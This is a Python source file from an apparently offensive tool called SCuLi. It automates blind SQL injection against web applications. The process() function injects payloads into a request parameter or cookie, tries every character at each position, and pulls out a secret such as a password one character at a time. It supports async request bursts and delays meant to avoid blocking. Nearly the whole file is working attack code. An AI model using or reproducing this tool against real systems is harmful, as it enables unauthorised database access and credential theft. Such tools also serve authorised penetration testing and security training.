import code.utils as utils
import code.req as req
import asyncio
import time
import json
from html import escape


def process(URL: str, TYPE: str, METHOD: str, PAYLOAD: str) -> int:

    def __init_SCuLi() -> utils.SQLi:
        SCuLi = utils.SQLi()
        if not utils.ARGS.input:
            SCuLi = utils.init_SQLi(SCuLi)
        else:
            print("[info] Hello Sir. All the job was made for you. Enjoy your meal my lord.")
            with open(utils.ARGS.input, "r") as in_file:
                in_json = in_file.read()
                in_SCuLi = json.loads(in_json)
                SCuLi.HTTP_params = in_SCuLi["HTTP_params"]
                SCuLi.injection = in_SCuLi["injection"]
                if "options" in in_SCuLi:
                    SCuLi.options = in_SCuLi["options"]
        return SCuLi

    SCuLi = __init_SCuLi()
    payload_1 = utils.adapt_payload(SCuLi, PAYLOAD)
    # Find which param is the sqli
    if not SCuLi.options["SQLi_in_cookie"]:
        sqli_key = ""
        for key, value in SCuLi.HTTP_params.items():
            if "<>" in value:
                sqli_key = key
                break

    print(f"[info] Payload is ready: `{payload_1}`")
    print("[info] If SCuLi is blocked during process: add some `--delay`.")
    utils.countdown()
    total_start = time.time()

    prepare_functions = {
        "async_mode":{
            "basic": lambda url, method, static, arr_data, SQLtype : asyncio.run(req.prepare_async_requests(url, method, static, arr_data, SQLtype)),
            "error": lambda url, method, static, arr_data, SQLtype : asyncio.run(req.prepare_async_requests(url, method, static, arr_data, SQLtype))
        },
        "sync_mode":{
            "basic": lambda url, method, static, arr_data, SQLtype : req.prepare_sync_requests(url, method, static, arr_data, SQLtype),
            "error": lambda url, method, static, arr_data, SQLtype : req.prepare_sync_requests(url, method, static, arr_data, SQLtype)
        }
    }

    exfiltred_data = ""
    max_len_password = 32
    data = SCuLi.HTTP_params.copy()
    mode = "async_mode" if utils.ARGS.speed else "sync_mode"
    for index in range(max_len_password):
        payload_2 = payload_1.replace('<index>', str(index+1))
        arr_data = []

        for c in utils.ALPHABET:
            if SCuLi.options["SQLi_in_cookie"]:
                cookie = SCuLi.options["SQLi_in_cookie"].replace("<>", payload_2.replace("<char>", escape(c)))
                arr_data.append(cookie)
            else:
                data[sqli_key] = SCuLi.HTTP_params[sqli_key].replace("<>", payload_2.replace('<char>', escape(c)))
                arr_data.append(data.copy())

        if SCuLi.options["SQLi_in_cookie"]:
            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, SCuLi.HTTP_params, arr_data, SQLtype="Cookie")
        else:
            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, utils.ARGS.cookie, arr_data, SQLtype="HTTP")

        if exfiltred:
            exfiltred_data += exfiltred
            print(f"[info] Char {index+1} found: `{exfiltred}` => `{exfiltred_data}`")
            if utils.ARGS.delay:
                time.sleep(float(utils.ARGS.delay))
        else:
            break
    utils.TIMING = round(time.time() - total_start, 2)
    return exfiltred_data


